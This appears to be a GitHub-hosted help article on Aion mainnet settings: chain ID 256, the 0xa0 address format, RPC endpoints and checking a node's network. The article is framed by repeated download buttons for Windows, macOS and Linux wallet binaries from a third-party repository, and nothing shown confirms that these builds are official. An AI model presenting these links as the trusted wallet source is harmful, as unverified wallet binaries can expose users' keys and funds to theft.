![Aion Wallet](assets/banner-article.png)

# Aion chain ID and RPC: the identifiers to use

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

Aion mainnet uses chain ID 256, and any tool that asks for a network identifier, an RPC endpoint or an address format should be given that value, an Aion endpoint, and an address beginning `0xa0`.

Getting one of those wrong is the usual reason a wallet shows an empty account or a node refuses a connection, and each mistake looks like a different problem from the outside.

## You'll see this if

- A wallet or a node asks for a chain ID.
- You are configuring a client and are unsure which network value to use.
- A developer tool connects but reports the wrong network.
- You are checking whether a node is on mainnet.

## The values

| Setting | Value |
|---|---|
| Network | Mainnet |
| Chain ID | 256 |
| Address format | `0xa0` plus 62 hexadecimal characters, 66 total |
| Native asset | AION |
| Consensus | Unity, alternating proof-of-work and proof-of-stake |

A test network or a local chain uses different values, and a client that is pointed at one of those will show balances that have nothing to do with mainnet. When a balance is unexpectedly empty, the chain ID is the second thing to check after the address.

## What an RPC endpoint is

The node exposes a JSON-RPC interface, and the wallet talks to it. Every balance, transaction and block that the wallet displays is fetched through that interface.

An endpoint can be a public service or a node you run. A public one is convenient and can be unavailable or behind the chain; a local node is more work and gives you a view you control.

The [how to run an Aion node](https://github.com/aion-wallet/aion-staking/blob/main/how-to-run-aion-node.md) guide covers the second option, and the [Aion explorer down](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-explorer-down.md) article explains why independence matters when a public service fails.

## Configuring a client

1. Set the network to mainnet rather than a test or local chain.
2. Enter the chain ID as 256.
3. Point the client at an endpoint that serves mainnet.
4. Restart it after the change, so the connection is rebuilt.
5. Confirm the address shown is the `0xa0` form and matches the account you expect.

Most clients store these settings per network, so a change made for one profile does not affect another. That is a common source of "it works on my other machine" reports.

## Confirming what a node is serving

Query the node for its network identity and compare the answer with 256. A node on a different chain will answer confidently and serve data that looks plausible, which is why the check is worth doing explicitly rather than assuming a successful connection means the right network.

If the node cannot answer at all, the problem is connectivity rather than identity, and the [Aion wallet not syncing](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-not-syncing.md) guide covers that path.

## RPC and the address format together

An RPC call can return a balance for an address that does not belong to the account you meant. Before debugging a number, confirm the address is 66 characters and begins `0xa0`, as described in the [Aion address format](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-address-format-0xa0.md) guide.

The two checks are complementary: the chain ID tells you which network, and the address tells you which account. Almost every "missing balance" resolves at one of them.

## Prevention

Write the chain ID down with the endpoint you use. A configuration note that records both is the difference between a five-minute fix and an evening.

Do not paste endpoints from unfamiliar pages into a wallet that holds funds. A malicious endpoint can serve false data, and the wallet will believe it.

Keep a local node if you stake or run infrastructure, and use it for the operations that matter.

## Test networks and local chains

A test network and a local chain use their own identifiers, and a client pointed at one of them will behave as if the account is empty. That is the intended behaviour: the address exists on mainnet, and the test chain has never seen it.

This is the second most common cause of an apparently missing balance, after restoring the wrong account. The check is quick: confirm the chain ID the client is using, and confirm the endpoint belongs to mainnet rather than to a development network.

Running a local chain is still the right way to develop, and the [how to run an Aion node](https://github.com/aion-wallet/aion-staking/blob/main/how-to-run-aion-node.md) guide covers the setup. Keep the profiles separate so a development session cannot be mistaken for a funded wallet.

## Frequently asked questions

### What is the Aion mainnet chain ID?

256.

### Is Aion EVM compatible?

No. It has its own virtual machine and its own address format, so EVM tooling does not work against it without adaptation.

### Do I need to run a node to use the wallet?

No. The wallet can use a public endpoint, and a node is an option for independence and reliability.

### Why does my wallet show the wrong network?

A profile configured for a test or local chain. Set mainnet, chain ID 256, and restart the client.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [How to run an Aion node](https://github.com/aion-wallet/aion-staking/blob/main/how-to-run-aion-node.md) - the endpoint you control.
- [Aion address format](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-address-format-0xa0.md) - the other half of a correct configuration.
- [Aion wallet not syncing](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-not-syncing.md) - when a correct configuration still will not connect.
- [What is Aion](https://github.com/aion-wallet/aion-explained/blob/main/what-is-aion.md) - the network those values identify.
